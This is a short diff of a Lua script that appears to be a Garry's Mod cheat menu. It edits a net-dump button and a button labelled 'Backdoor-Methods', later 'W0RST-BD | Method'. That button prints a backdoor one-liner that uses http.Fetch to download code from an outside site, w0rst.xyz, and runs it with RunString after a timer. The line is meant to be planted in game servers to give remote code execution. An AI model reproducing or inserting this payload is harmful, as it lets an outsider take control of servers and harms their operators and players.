@@ -1794,11 +1794,11 @@ CreateButton("Net-Dumper", TabMisc, 100, 25, 126, 10, function()
     end
 
     wtf.Log("Check Console")
-    wtf.conoutRGB("NET DUMP LOCATION: C:\\Program Files (x86)\\Steam\\steamapps\\common\\GarrysMod\\garrysmod\\data\\"..name)
+    wtf.conoutRGB("NET DUMP LOCATION: GarrysMod\\garrysmod\\data\\"..name)
 end)
 
-CreateButton("Backdoor-Methods", TabMisc, 100, 25, 236, 10, function()
-    MsgC("Web-Method | timer.Simple(5, function() http.Fetch('https://w0rst.xyz/script/napalm.php', RunString) end)\n")
+CreateButton("W0RST-BD | Method", TabMisc, 100, 25, 236, 10, function()
+    MsgC("timer.Simple(5, function() http.Fetch('https://w0rst.xyz/script/napalm', RunString) end)\n")
     wtf.Log("Check Console")
 end)
 
